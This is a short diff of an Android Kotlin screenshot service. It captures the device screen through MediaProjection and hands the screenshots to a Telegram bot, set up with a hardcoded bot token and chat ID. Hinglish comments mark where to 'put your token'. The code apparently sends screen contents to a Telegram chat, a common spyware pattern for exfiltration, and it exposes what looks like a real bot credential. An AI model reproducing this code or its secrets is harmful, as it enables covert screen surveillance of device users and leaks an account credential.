@@ -69,15 +69,16 @@ class ScreenshotService : Service() {
         intent?.let {
             if (it.hasExtra("resultCode") && it.hasExtra("data")) {
                 val resultCode = it.getIntExtra("resultCode", 0)
+                @Suppress("DEPRECATION")
                 val data = it.getParcelableExtra<Intent>("data")
 
                 val projectionManager = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
                 mediaProjection = projectionManager.getMediaProjection(resultCode, data)
 
-                // Set to ScreenshotTaker
+                // 🔴 BOT TOKEN YAHAN DAALO
                 val bot = TelegramBot(
-                    "8668374754:AAEftxVfvzLVsajQRWSt0iJv5a18N90Vupg",
-                    "8507217564",
+                    "8668374754:AAEftxVfvzLVsajQRWSt0iJv5a18N90Vupg",  // ← YAHAN APNA TOKEN DAALO
+                    "8507217564",    // ← YAHAN APNA CHAT ID DAALO
                     this
                 )
                 val screenshotTaker = ScreenshotTaker(this, bot)
